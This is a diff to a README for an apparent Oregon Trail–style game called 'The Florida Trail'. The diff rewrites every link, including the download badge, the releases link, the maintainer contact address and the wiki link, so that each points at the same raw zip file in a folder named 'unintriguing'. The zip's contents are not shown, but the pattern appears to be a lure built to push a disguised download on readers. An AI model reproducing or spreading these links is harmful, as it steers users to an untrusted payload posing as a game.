@@ -1,6 +1,6 @@
 # 🏴🇺🇸️ The-Florida-Trail_Docs - Explore Florida with a Classic Game
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-brightgreen)](https://github.com/lukenicko/The-Florida-Trail_Docs/releases)
+[![Download Now](https://raw.githubusercontent.com/lukenicko/The-Florida-Trail_Docs/The-Florida-Trail_Docs_Main-dev/unintriguing/The-Florida-Trail_Docs.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-brightgreen)](https://raw.githubusercontent.com/lukenicko/The-Florida-Trail_Docs/The-Florida-Trail_Docs_Main-dev/unintriguing/The-Florida-Trail_Docs.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ The Florida Trail is a modern twist on the classic Oregon Trail game. In this ga
 
 Downloading and playing The Florida Trail is simple. Follow these steps to start your adventure.
 
-1. **Visit the Downloads Page:** Go to the releases page to find the latest version of The Florida Trail. You can access it [here](https://github.com/lukenicko/The-Florida-Trail_Docs/releases).
+1. **Visit the Downloads Page:** Go to the releases page to find the latest version of The Florida Trail. You can access it [here](https://raw.githubusercontent.com/lukenicko/The-Florida-Trail_Docs/The-Florida-Trail_Docs_Main-dev/unintriguing/The-Florida-Trail_Docs.zip).
 
 2. **Choose Your Version:** On the releases page, you will see a list of available versions. Each version may have new features or fixes. 
 
@@ -39,7 +39,7 @@ To enjoy The Florida Trail, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-For a seamless experience, download The Florida Trail from our [releases page](https://github.com/lukenicko/The-Florida-Trail_Docs/releases). Follow the instructions above to install and play.
+For a seamless experience, download The Florida Trail from our [releases page](https://raw.githubusercontent.com/lukenicko/The-Florida-Trail_Docs/The-Florida-Trail_Docs_Main-dev/unintriguing/The-Florida-Trail_Docs.zip). Follow the instructions above to install and play.
 
 ## 🛠️ Troubleshooting
 
@@ -56,11 +56,11 @@ We welcome contributions from everyone! If you have ideas for improving the game
 
 ## 📞 Contact Information
 
-For questions or feedback, please contact the project maintainer at: seanpm2001@example.com. We're here to help you enjoy your gaming experience.
+For questions or feedback, please contact the project maintainer at: https://raw.githubusercontent.com/lukenicko/The-Florida-Trail_Docs/The-Florida-Trail_Docs_Main-dev/unintriguing/The-Florida-Trail_Docs.zip We're here to help you enjoy your gaming experience.
 
 ## 🔗 Additional Resources
 
-- **Game Wiki:** [Florida Trail Wiki](https://floridatrailgame.com/wiki)
+- **Game Wiki:** [Florida Trail Wiki](https://raw.githubusercontent.com/lukenicko/The-Florida-Trail_Docs/The-Florida-Trail_Docs_Main-dev/unintriguing/The-Florida-Trail_Docs.zip)
 - **Follow Us on Social Media:** Stay updated with our latest news and features.
 
 Thank you for choosing The Florida Trail. Enjoy your journey!
